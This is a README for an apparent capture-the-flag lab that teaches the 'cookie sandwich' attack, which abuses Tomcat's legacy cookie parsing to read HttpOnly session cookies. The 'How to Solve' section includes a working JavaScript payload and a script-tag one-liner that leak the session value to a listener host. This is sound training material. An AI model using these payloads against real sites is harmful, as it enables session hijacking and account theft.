## 🚀 Overview
Here's my [Blog](https://blog.fooo1.com/cookie-sandwich-attack) :)

Modern browsers and servers usually follow **RFC6265** for cookie parsing—treating quotes as literal characters—while some legacy-compatible servers (e.g. Tomcat) will switch to **RFC2109/2965** parsing when they detect a `$Version` cookie.  
This challenge lets you:
1. Spin up a small, vulnerable JSP app in Docker  
2. Craft a “cookie sandwich” via JavaScript  
3. Leak a JSESSIONID(HttpOnly) cookie and post it back to the attacker bot  
4. Capture the flag! 🎉

## 📖 Background

- **RFC2109/2965 (Legacy)**  
  - Recognizes `$Version`, `$Path`, `$Domain` attributes  
  - Treats quoted values as one continuous string  
- **RFC6265 (Modern)**  
  - Delivers stricter parsing: semicolons always break name/value pairs  
  - Quotes are part of the value  

Tomcat’s dual-mode support means that by creating:
```js
document.cookie = '$Version=1; path=/json.jsp;';
document.cookie = 'param1="start; path=/json.jsp;';
document.cookie = 'param2=end"; path=/;';
```
the **legacy** parser will see:

```
param1="start;JSESSIONID=<secret>;param2=end"
```

…letting you read an HttpOnly session cookie!


## 🛠️ Setup & Run

1. **Clone this repo**
   ```bash
   git clone https://github.com/your-org/cookie-sandwich-wargame.git
   cd cookie-sandwich-wargame
   ```

2. **Set your secrets**  
   Create a `.env` in the repo root:
   ```ini
   ADMIN_PASSWORD=supersecret
   FLAG=CTF{you_sandwiched_them}
   ```

3. **Launch with Docker Compose**
   ```bash
   docker-compose up --build
   ```
   - **Tomcat** runs on `http://localhost:8080/`
   - **Bot server** (listener) runs on `http://localhost:8000/`

4. **Visit the challenge page**  
   Navigate to `http://localhost:8080/test.jsp` (or whichever front-end you provide).


## 💡 How to Solve

1. Trigger an XSS (or paste code in your browser console) on the test page.
2. Execute the cookie-sandwich payload:
   ```js
   document.cookie = '$Version=1; path=/json.jsp;';
   document.cookie = 'param1="start; path=/json.jsp;';
   document.cookie = 'param2=end"; path=/;';
   fetch('/json.jsp', { credentials: 'include' })
     .then(r => r.json())
     .then(data => {
       fetch('http://localhost:8000/', {
         method: 'POST',
         body: JSON.stringify(data)
       });
     });
   ```
3. The bot service will receive your leaked `session` value—check its logs (or UI) for the flag.

For a minimal one-liner (no whitespace):
```html
<script>document.cookie='$Version=1; path=/json.jsp;';document.cookie='param1="start; path=/json.jsp;';document.cookie='param2=end"; path=/;';fetch('/json.jsp',{credentials:'include'}).then(r=>r.json()).then(d=>fetch('http://localhost:8000/',{method:'POST',body:JSON.stringify(d)}));</script>
```


## 🔧 Challenge Files

- **`docker-compose.yml`** – Orchestrates two services:  
  - **`tomcat`** (vulnerable JSP app)  
  - **`bot`** (Flask+Selenium listener)
- **`tomcat/json.jsp`** – Returns the first non-JSESSIONID cookie value in JSON.
- **`flag.jsp`** (optional) – Protected page that requires a valid session.
- **`bot/`** – Contains the admin bot Dockerfile and listener code to capture your submission.


## 📝 References

- [PortSwigger: Stealing HttpOnly Cookies with the Cookie Sandwich Technique](https://portswigger.net/research/cookie-sandwich)  
- [SnoopBees Blog: HTTP Cookie Sandwich Attack](https://snoopbees.com/blog/http-cookie-sandwich-attack)  
